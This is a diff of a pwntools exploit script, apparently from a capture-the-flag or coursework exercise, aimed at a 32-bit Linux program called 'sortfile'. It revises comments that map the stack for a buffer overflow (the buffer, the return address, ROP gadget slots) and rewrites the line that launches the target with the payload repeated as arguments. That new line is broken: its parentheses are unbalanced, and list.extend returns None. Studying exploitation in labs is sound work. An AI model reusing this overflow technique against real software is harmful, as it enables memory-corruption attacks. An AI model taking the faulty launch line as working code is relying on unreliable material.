@@ -30,19 +30,20 @@ context(arch='i386', os='linux')
 
 
 
-# ebp + 0x40; main arg3
-# ebp + 0x3c; main arg2
-# ebp + 0x38; main arg1
-# ebp + 0x34; min nargs
-# ebp + 0x30; main return addr ; 
-# ebp + 0x2c; main ebp
+# ebp + 0x40 + ?; main arg3
+# ebp + 0x3c + ?; main arg2
+# ebp + 0x38 + ?; main arg1
+# ebp + 0x34 + ?; min nargs
+# ebp + 0x30 + ?; main return addr ; 
+# ebp + 0x2c + ?; main ebp
+# ... Some unknown amount due to alignment. +-0x1
+# ebp + 0x2c	; last local variable from main.
+# ebp + 0xc 	; local variable from main
+# ebp + 8		; arg 1 ; gadgetx30
+# ebp + 4  		; gadget 1 ;ret address
+# ebp 			; garbage
 # ...
-# ebp + 0xc ; local variable from main
-# ebp + 8	; arg 1 ; gadgetx30
-# ebp + 4  	; gadget 1 ;ret address
-# ebp 		; garbage
-
-# ebp -0x100c ; 
+# ebp + 0x100c 	; Char buffer to overflow
 
 
 
@@ -68,7 +69,7 @@ with open("file.in", "w") as f:
 # Start the program as a subprocess
 # so we can communicate with it
 # Extra because of memory alignment in main.
-p = process(['./sortfile',exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit])
+p = process(['./sortfile'].extend([exploit]*32)
 
 # Optional: attach GDB to the process and run some GDB commands
 # gdb.attach(p, '''
